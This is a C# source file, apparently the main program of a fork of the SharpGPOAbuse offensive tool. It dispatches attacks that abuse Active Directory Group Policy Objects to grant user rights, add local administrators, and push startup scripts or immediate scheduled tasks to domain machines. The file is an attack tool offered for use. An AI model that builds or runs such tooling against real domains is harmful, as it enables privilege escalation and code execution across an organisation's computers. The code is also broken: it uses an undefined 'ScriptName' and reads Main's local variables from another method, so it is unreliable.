using System;
using System.DirectoryServices.ActiveDirectory;
namespace SharpGPOAbuse
{
  class Program
  {
    static void Main(string[] args)
    {

      try {
        Domain currentDomain = Domain.GetCurrentDomain();
        string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
        string DomainName = currentDomain.Name.ToLower();

        string[] DCs;
        string DistinguishedName = "CN=Policies,CN=System";

        DCs = DomainName.Split('.');

        foreach (string DC in DCs) {
          DistinguishedName += ",DC=" + DC;
        }

        if (args.Length > 0) {
          string AttackName = args[0];
          if (AttackName.ToLower() == "addnewrights") {
            if (args.Length == 4) {
              PrintInfo();
              string GPOName = args[1];
              string UserAccount = args[2];
              string[] UserRights = args[3].Split(',');
              UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newlocaladmin") {
            if (args.Length == 3) {
              PrintInfo();

              string GPOName = args[1];
              string UserAccount = args[2];
              LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, false);
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newstartupscript") {
            if (args.Length == 4) {
              PrintInfo();
              string GPOName = args[1];
              string UserAccount = args[2];
              string ScriptContent = args[3];
              StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              PrintHelp();
            }

          } else if (AttackName.ToLower() == "newimmediatetask") {
            if (args.Length == 6) {
              PrintInfo();
              string GPOName = args[1];
              string Author = args[2];
              string TaskName = args[3];
              string Command = args[4];
              string Arguments = args[5];
              ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, Arguments, Command, false, "Computer");
            } else {
              Console.WriteLine("Invalid Argument Length for Attack Type!");
              PrintHelp();
            }

          } else {
            Console.WriteLine("Unsupported Attack Type! Sorry!");
            PrintHelp();

          }
        } else {
          PrintHelp();
        }
      } catch (Exception e) {
        Console.Error.WriteLine("[!] {0}", e.Message);
      }
    }

    public static void PrintHelp()
    {
      Console.WriteLine("SharpGPOAbuse (Friendly Fork)");
      Console.WriteLine("");
      Console.WriteLine("  AddNewRights:");
      Console.WriteLine("    SharpGPOAbuse.exe AddNewRights [GPOName] [UserAccount] [UserRights CSV]");
      Console.WriteLine("  NewLocalAdmin:");
      Console.WriteLine("    SharpGPOAbuse.exe NewLocalAdmin [GPOName] [UserAccount]");
      Console.WriteLine("  NewStartupScript:");
      Console.WriteLine("    SharpGPOAbuse.exe NewStartupScript [GPOName] [UserAccount] [ScriptContent]");
      Console.WriteLine("  NewImmediateTask:");
      Console.WriteLine("    SharpGPOAbuse.exe NewImmediateTask [GPOName] [Author] [TaskName] [CommandPath] [Arguments]");
    }

    public static void PrintInfo()
    {
      Console.WriteLine($"[+] Domain = {DomainName}");
      Console.WriteLine($"[+] Domain Controller = {DomainController}");
      Console.WriteLine($"[+] Distinguished Name = {DistinguishedName}");
    }
  }
}